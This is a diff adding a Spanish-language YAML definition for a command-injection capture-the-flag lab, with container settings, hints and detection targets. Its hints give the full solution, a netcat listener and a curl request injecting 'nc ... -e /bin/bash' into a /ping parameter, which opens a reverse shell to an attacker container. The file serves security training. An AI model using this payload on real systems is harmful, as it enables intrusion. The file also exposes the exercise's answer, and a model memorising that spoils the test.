@@ -1,0 +1,36 @@
+title: "Command Injection → Reverse Shell"
+description: >
+  La aplicación vulnerable expone un endpoint /ping?host=... que ejecuta
+  el comando sin sanitizar. Explota la inyección para establecer una reverse
+  shell desde el servidor hacia tu máquina atacante.
+author: "Dylan Riquelme"
+level: intermediate
+category: web
+
+environment:
+  image: "vuln-command-injection"
+  attacker_image: "flexipwn-attacker"
+  log_paths: []
+  ports: []
+  attacker_ports:
+    - "2222:22"
+  startup_delay_seconds: 3.0
+
+hints:
+  - "El env_id se muestra al iniciar el run. Los contenedores se llaman flexipwn-{env_id}-vulnerable y flexipwn-{env_id}-attacker dentro de la red interna."
+  - "Primero entra al atacante por SSH (puerto expuesto en la CLI) y abre un listener: nc -lvp 4444"
+  - "Desde el atacante, envía el payload al vulnerable: curl 'http://flexipwn-{env_id}-vulnerable:5000/ping?host=;nc+flexipwn-{env_id}-attacker+4444+-e+/bin/bash'"
+  - "El endpoint /ping ejecuta el comando sin sanitizar"
+
+targets:
+  - type: network_connection
+    dst_port: 4444
+    description: "Conexión TCP hacia el puerto 4444 del atacante detectada"
+
+  - type: file_created
+    path: "/root/"
+    pattern: "*.txt"
+    description: "Archivo .txt creado en directorio root"
+
+condition: all
+timeout_seconds: 1800
